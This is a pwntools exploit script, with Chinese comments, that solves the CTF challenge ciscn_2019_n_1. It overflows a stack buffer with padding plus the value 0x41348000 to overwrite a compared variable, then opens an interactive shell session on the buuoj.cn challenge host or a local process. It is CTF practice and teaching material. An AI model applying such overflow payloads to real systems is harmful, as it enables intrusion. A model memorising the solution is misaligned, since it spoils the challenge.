'''
@Author       : 白银
@Date         : 2023-03-11 17:10:02
@LastEditors  : 白银
@LastEditTime : 2023-03-12 14:18:53
@FilePath     : /pwn/ciscn_2019_n_1.py
@Description  : https://buuoj.cn/challenges#ciscn_2019_n_1
@Attention    : 本地出不了flag
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *


def set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port):
    # set_arch = 0

    if set_arch == 0:
        context(log_level='debug', arch='amd64', os='linux')
    elif set_arch == 1:
        context(log_level='debug', arch='arm64', os='linux')
    elif set_arch == 2:
        context(log_level='debug', arch='i386', os='linux')

    # pwnfile = './pwn1'
    elf = ELF(pwnfile)

    # if_remote = 0  # 0为远程

    if if_remote == 1:
        # io = remote("192.168.61.139", 8888)
        io = remote(remote_addr, remote_port)
        # io = remote("node4.buuoj.cn", 26852)
        # libc = ELF('/home/jack/Desktop/libc.so.6')

        if set_arch == 0 or set_arch == 1:
            libc = ELF('/home/jack/Desktop/x64_libc.so.6')
        else:
            libc = ELF('/home/jack/Desktop/x86_libc.so.6')
    else:
        io = process(pwnfile)

        # 本地用
        # elf = ELF(pwnfile)
        libc = elf.libc
        rop = ROP(pwnfile)

        # 本地调试用
        gdb.attach(io)
        pause()
    
    padding = 0x30 - 0x4 # ida看，上限和s差多少，扣掉里面夹的v2
    return_addr = 0x41348000  # 程序里面找，有现成的11.28125的十六进制，手动写得弄清楚大小端序
    payload = flat(['a' * padding, return_addr])

    delimiter = 'Let\'s guess the number.'

    if if_remote == 1:
        # io.sendline(payload)  # 远程用
        io.sendlineafter(delimiter, payload)
    else:
        io.sendlineafter(delimiter, payload)  # 本地用
        # io.sendline(payload)

    io.interactive()

if __name__ == '__main__':
    set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
    pwnfile = './ciscn_2019_n_1'  # pwnfile， str，二进制文件
    if_remote = 1  # if_remote，int，1→远程，别的数字→本地
    # remote_addr = "192.168.61.139"  # remote_addr，str，远程地址
    # remote_port = 8888  # remote_port，int， 远程端口
    remote_addr = "node4.buuoj.cn"  # remote_addr，str，远程地址
    remote_port = 25111  # remote_port，int， 远程端口
    # 打本地，if_remote改别的数字就可以，最后两个参数随便改
    # set_arch, pwnfile, if_remote, remote_addr, remote_port
    set_pwn(set_arch, pwnfile, if_remote, remote_addr, remote_port)